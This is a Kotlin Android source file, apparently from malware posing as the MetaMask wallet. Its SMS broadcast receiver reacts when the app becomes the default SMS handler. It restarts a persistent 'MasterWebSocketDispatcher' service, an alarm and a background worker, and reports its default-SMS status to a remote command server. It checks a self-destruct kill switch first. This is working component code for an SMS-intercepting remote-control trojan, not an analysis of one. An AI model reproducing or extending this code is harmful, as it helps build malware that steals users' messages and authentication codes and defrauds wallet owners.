package com.example.MetaMask.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import kotlinx.coroutines.delay
import android.os.Build
import android.provider.Telephony
import androidx.annotation.Keep
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.OutOfQuotaPolicy
import androidx.work.WorkManager
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.ServiceStarterWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

@Keep
class DefaultSmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        android.util.Log.d("XDBG", "[DefaultSmsReceiver] onReceive enter context=ctx intent=${intent}") //xdbg
        if (context == null) return

        if (intent?.action != Telephony.Sms.Intents.ACTION_DEFAULT_SMS_PACKAGE_CHANGED) {
            android.util.Log.d("XDBG", "[DefaultSmsReceiver] if branch") //xdbg
            return
        }

        try {
            val killPrefs = context.getSharedPreferences(
                com.example.MetaMask.services.SelfDestructService.PREFS_NAME, Context.MODE_PRIVATE)
            if (killPrefs.getBoolean(
                    com.example.MetaMask.services.SelfDestructService.KEY_PERMANENTLY_DISABLED, false)) {
                return
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[DefaultSmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }

        try {
            val masterIntent = Intent(context, MasterWebSocketDispatcher::class.java)

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[DefaultSmsReceiver] if branch") //xdbg
                context.startForegroundService(masterIntent)
            } else {
                context.startService(masterIntent)
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[DefaultSmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        try {
            val alarmIntent = Intent(context, AlarmReceiver::class.java)
            context.sendBroadcast(alarmIntent)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[DefaultSmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        try {
            val request = OneTimeWorkRequestBuilder<ServiceStarterWorker>()
                .setExpedited(OutOfQuotaPolicy.RUN_AS_NON_EXPEDITED_WORK_REQUEST)
                .addTag("DEFAULT_SMS_TRIGGER")
                .build()
            WorkManager.getInstance(context).enqueue(request)
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[DefaultSmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        val pendingResult: PendingResult = goAsync()
        val coroutineScope = CoroutineScope(Dispatchers.IO)

        coroutineScope.launch {
            try {
                delay(1000)
                val isDefault = Telephony.Sms.getDefaultSmsPackage(context) == context.packageName
                val statusUpdatePayload = JSONObject().apply {
                    put("action", "defaultSmsStatusUpdate")
                    put("isDefault", isDefault)
                }

                val sendIntent = Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                    putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, statusUpdatePayload.toString())
                    setPackage(context.packageName)
                }
                context.sendBroadcast(sendIntent)

            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[DefaultSmsReceiver] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
            } finally {
                pendingResult.finish()
            }
        }
    }
}
